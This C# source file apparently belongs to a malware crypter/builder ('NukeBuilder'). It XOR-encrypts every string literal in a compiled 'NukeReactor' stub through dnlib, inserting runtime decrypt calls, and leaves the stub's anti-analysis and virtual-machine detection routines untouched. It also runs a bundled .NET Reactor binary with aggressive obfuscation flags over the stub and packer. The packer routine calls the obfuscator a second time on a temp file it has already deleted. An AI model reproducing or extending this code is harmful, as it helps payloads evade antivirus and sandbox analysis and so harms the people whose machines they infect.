using dnlib.DotNet;
using dnlib.DotNet.Emit;
using NukeBuilder.Algorithms.EncryptHelper;
using System;
using System.Diagnostics;
using System.IO;

namespace NukeBuilder.Algorithms.Cryptor
{
    public class Protector
    {

        public static void PerformProtect(string outputFile, byte XorKey)
        {

            string directory = Path.GetDirectoryName(outputFile);
            string originalFileName = Path.GetFileName(outputFile);
            string moduleNew = Path.Combine(directory, $"tmp_{originalFileName}");
            try
            {
                File.Copy(outputFile, moduleNew, overwrite: true);
                using (ModuleDef module = ModuleDefMD.Load(moduleNew))
                {
                    EncryptStrings(module, XorKey);
                    
                    module.Write(outputFile);
                }
            }

            catch (Exception ex)
            {
                Console.WriteLine($"Protect failed: {ex.Message}\nFailed method: {ex.TargetSite}");
            }
            finally
            {
                if (File.Exists(moduleNew))
                    File.Delete(moduleNew);
            }
        }

        private static void EncryptStrings(ModuleDef module, byte xorKey)
        {
            foreach (var type in module.Types)
            {
                foreach (var method in type.Methods)
                {
                    if (type.FullName == "NukeReactor.XorBytes" && method.Name == "XorEncrypt")
                        continue;

                    if (type.FullName == "NukeReactor.AntiAnalysis" && method.Name == "DetectVirtualMachine")
                        continue;

                    if (!method.HasBody) continue;

                    for (int i = 0; i < method.Body.Instructions.Count; i++)
                    {
                        var instr = method.Body.Instructions[i];
                        if (instr.OpCode == OpCodes.Ldstr)
                        {
                            string originalString = instr.Operand as string;
                            if (originalString != null)
                            {
                                instr.Operand = XOREncrypt.XorEncryptToNumbers(originalString, xorKey);

                                var xorBytesType = module.Find("NukeReactor.XorBytes", false);
                                if (xorBytesType == null)
                                    throw new Exception("Not found type 'NukeReactor.XorBytes' in module.");

                                var decryptMethod = xorBytesType.FindMethod("XorDecrypt");
                                if (decryptMethod == null)
                                    throw new Exception("Not found method 'XorDecrypto' in Class 'NukeReactor.XorBytes'.");

                                var callInstruction = new Instruction(OpCodes.Call, decryptMethod);
                                method.Body.Instructions.Insert(i + 1, callInstruction);
                                i++; 
                            }
                        }
                    }
                }
            }
        }
        public static void ProtectReactorStub(string inFile)
        {
            string reactorPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "FusionModule", "reactor.lib");


            string originalFileName = Path.GetFileName(inFile);

            string moduleNew = Path.Combine(Path.GetDirectoryName(inFile), $"tmp_{originalFileName}");

            if (!File.Exists(reactorPath)) { return; }
            string commandline = "-licensed -hide_calls 1 -hide_calls_internals 1 -control_flow 1 -flow_level 4 -necrobit 1 -necrobit_comp 1 -all_params 1 -obfuscate_public_types 1 -naming unprintable -stringencryption 1";

            try
            {
                File.Copy(inFile, moduleNew, overwrite: true);


                RunReactor(commandline, reactorPath, moduleNew, inFile);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

            finally
            {
                if (File.Exists(moduleNew))
                    File.Delete(moduleNew);
            }
        }

        public static void ProtectReactorPacker(string inFile)
        {
            string reactorPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "FusionModule", "reactor.lib");


            string originalFileName = Path.GetFileName(inFile);

            string moduleNew = Path.Combine(Path.GetDirectoryName(inFile), $"tmp_{originalFileName}");

            if (!File.Exists(reactorPath)) { return; }

            string commandline = "-licensed -hide_calls 1 -hide_calls_internals 1 -control_flow 1 -flow_level 7 -necrobit 1 -necrobit_comp 1 -all_params 1 -obfuscate_public_types 1 -naming unprintable -stringencryption 1";

            try
            {
                File.Copy(inFile, moduleNew, overwrite: true);


                RunReactor(commandline, reactorPath, moduleNew, inFile);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

            finally
            {
                if (File.Exists(moduleNew))
                    File.Delete(moduleNew);
            }

            RunReactor(commandline, reactorPath, moduleNew, inFile);
        }

        private static void RunReactor(string commandline, string reactorPath, string inputFile, string outFile)
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = reactorPath,
                Arguments = $"{commandline} -file \"{inputFile}\" -targetfile {outFile}",
                UseShellExecute = false,
                CreateNoWindow = true
            })?.WaitForExit();
        }
    }
}
